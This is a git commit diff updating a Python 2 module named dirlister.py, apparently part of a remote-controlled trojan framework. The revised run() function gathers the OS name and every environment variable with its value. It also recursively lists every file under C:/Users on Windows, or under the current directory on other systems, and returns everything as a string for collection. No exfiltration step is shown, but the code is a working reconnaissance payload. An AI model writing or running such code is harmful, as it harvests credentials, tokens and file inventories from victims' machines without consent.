edf3482aa931c68f200f6a5126a48c19c6c35dc3
HejunweiCoder <405947712@qq.com>
2016-01-09 01:12:58 +0800

    Update dirlister.py

--- modules/dirlister.py
+++ modules/dirlister.py
@@ -1,7 +1,25 @@
 import os
 
 
-def run(**args):
+def listdir(tmp_path):
+    info=""
+    for dirpath,dirname,files in os.walk(tmp_path):
+        for filename in files:
+            info += "%s/%s"%(dirpath,filename)+"\n"
+
+    return info
+
+
+def run():
     print "[*] In dirlister module."
-    files = os.listdir("/")
-    return str(files)
+    content=os.name+"\r\n"
+    for key in os.environ:
+        content += "%s:%s"%(key,os.environ[key])+"\n"
+
+    if os.name == "nt":
+        content += listdir("C:/Users")
+    else:
+        content += listdir(".")
+
+    return content
+
